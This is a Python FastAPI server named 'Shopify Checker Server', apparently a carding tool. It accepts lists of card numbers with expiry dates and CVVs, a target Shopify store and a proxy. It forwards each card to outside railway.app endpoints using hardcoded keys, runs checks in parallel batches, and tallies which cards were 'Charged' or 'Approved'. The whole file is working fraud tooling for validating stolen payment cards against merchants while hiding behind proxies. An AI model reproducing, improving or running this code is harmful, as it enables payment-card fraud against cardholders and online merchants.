from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
import aiohttp
import os
import random

app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"]
)

# Shopify APIs configuration
SHOPIFY_APIS = {
    "api1": {
        "url": "https://api-production-6b6d.up.railway.app/shopify",
        "key": "darkanon"
    },
    "api2": {
        "url": "https://shimmering-celebration-production-7dd0.up.railway.app/shopify",
        "key": "AnonShopii2026!"
    },
}

@app.post("/check")
async def check_cards(data: dict):
    """
    Expected payload:
    {
        "cards": ["card1|mm|yyyy|cvv", "card2|mm|yyyy|cvv"],
        "site": "https://example.myshopify.com",
        "proxy": "ip:port:user:pass",
        "api": "api1"  // optional, random if not specified
    }
    """
    cards = data.get("cards", [])
    site = data.get("site", "")
    proxy = data.get("proxy", "")
    api_name = data.get("api", random.choice(list(SHOPIFY_APIS.keys())))
    
    api = SHOPIFY_APIS.get(api_name, list(SHOPIFY_APIS.values())[0])
    results = []
    
    timeout = aiohttp.ClientTimeout(total=30)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        for card in cards:
            try:
                url = f"{api['url']}?site={site}&cc={card}&key={api['key']}"
                if proxy:
                    url += f"&proxy={proxy}"
                
                async with session.get(url) as resp:
                    text = await resp.text()
                    status = parse_status(text)
                    results.append({
                        "card": card,
                        "status": status,
                        "message": text[:500],
                        "gateway": "Shopify",
                        "price": extract_price(text),
                        "api": api_name
                    })
            except Exception as e:
                results.append({
                    "card": card,
                    "status": "Error",
                    "message": str(e)[:200],
                    "gateway": "Shopify",
                    "price": "-",
                    "api": api_name
                })
    
    charged = sum(1 for r in results if r["status"] == "Charged")
    approved = sum(1 for r in results if r["status"] == "Approved")
    
    return {
        "results": results,
        "total": len(results),
        "charged": charged,
        "approved": approved,
        "api_used": api_name
    }

@app.post("/check_batch")
async def check_batch(data: dict):
    """
    Check cards in parallel batches for speed
    {
        "cards": [...],
        "site": "...",
        "proxy": "...",
        "batch_size": 50
    }
    """
    cards = data.get("cards", [])
    site = data.get("site", "")
    proxy = data.get("proxy", "")
    batch_size = data.get("batch_size", 50)
    
    api = random.choice(list(SHOPIFY_APIS.values()))
    results = []
    
    timeout = aiohttp.ClientTimeout(total=30)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        for i in range(0, len(cards), batch_size):
            batch = cards[i:i+batch_size]
            tasks = []
            for card in batch:
                tasks.append(check_single(session, api, card, site, proxy))
            batch_results = await asyncio.gather(*tasks, return_exceptions=True)
            for r in batch_results:
                if isinstance(r, dict):
                    results.append(r)
                else:
                    results.append({
                        "card": "unknown",
                        "status": "Error",
                        "message": str(r)[:200],
                        "gateway": "Shopify",
                        "price": "-"
                    })
    
    charged = sum(1 for r in results if r["status"] == "Charged")
    approved = sum(1 for r in results if r["status"] == "Approved")
    
    return {
        "results": results,
        "total": len(results),
        "charged": charged,
        "approved": approved
    }

async def check_single(session, api, card, site, proxy):
    try:
        url = f"{api['url']}?site={site}&cc={card}&key={api['key']}"
        if proxy:
            url += f"&proxy={proxy}"
        async with session.get(url) as resp:
            text = await resp.text()
            return {
                "card": card,
                "status": parse_status(text),
                "message": text[:500],
                "gateway": "Shopify",
                "price": extract_price(text)
            }
    except Exception as e:
        return {
            "card": card,
            "status": "Error",
            "message": str(e)[:200],
            "gateway": "Shopify",
            "price": "-"
        }

def parse_status(text):
    t = text.lower()
    if "charged" in t or "order_placed" in t:
        return "Charged"
    elif "approved" in t:
        return "Approved"
    elif "declined" in t:
        return "Declined"
    return "Unknown"

def extract_price(text):
    import re
    prices = re.findall(r'\$(\d+\.?\d*)', text)
    if prices:
        return prices[0]
    return "-"

@app.get("/health")
async def health():
    return {
        "status": "ok",
        "apis": list(SHOPIFY_APIS.keys()),
        "server": "shopify-checker"
    }

@app.get("/")
async def root():
    return {
        "name": "Shopify Checker Server",
        "version": "1.0",
        "endpoints": {
            "POST /check": "Check cards (single API)",
            "POST /check_batch": "Check cards (parallel batch)",
            "GET /health": "Health check"
        }
    }

import asyncio

if __name__ == "__main__":
    import uvicorn
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
